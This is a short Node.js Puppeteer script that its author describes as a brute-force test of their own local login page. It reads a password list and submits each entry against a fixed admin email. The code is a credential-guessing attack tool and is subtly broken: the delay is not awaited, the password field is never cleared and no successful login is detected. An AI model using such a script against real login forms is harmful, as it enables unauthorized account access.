//I want to test brute force ataack my login.html. Firstly read passwords.txt and then try to login with these passwords.

const fs = require('fs');
const path = require('path');
const puppeteer = require('puppeteer');
const { setTimeout } = require('timers/promises');


(async () => {

    try {
        // Yeni bir tarayıcı örneği başlat
        const browser = await puppeteer.launch({ headless: false })  



        const page = await browser.newPage();
        // Giriş yapılacak web sitesini aç
        await page.goto('http://127.0.0.1:5500/bruteforceSample/login.html');

        // Kullanıcı adı ve şifre alanlarını bul ve değerleri doldur
        await page.type('#email', 'admin@mail.com'); // '#username' kullanıcı adı alanının seçicisi

        //read my password.txt file
        const data = fs.readFileSync(path.join(__dirname, 'passwords.txt'), 'utf8');
        const passwords = data.split('\n');

        console.log(passwords);
        for (let i = 0; i < passwords.length; i++) {
            await page.type('#password', passwords[i]);
            await page.click('#login');
            //wait 1 second
            //wait 1 second
            setTimeout(1000);
     
        }
        // Giriş butonunu bul ve tıkla
        await page.click('#login');
    } catch (error) {
        console.log(error);
    }


})();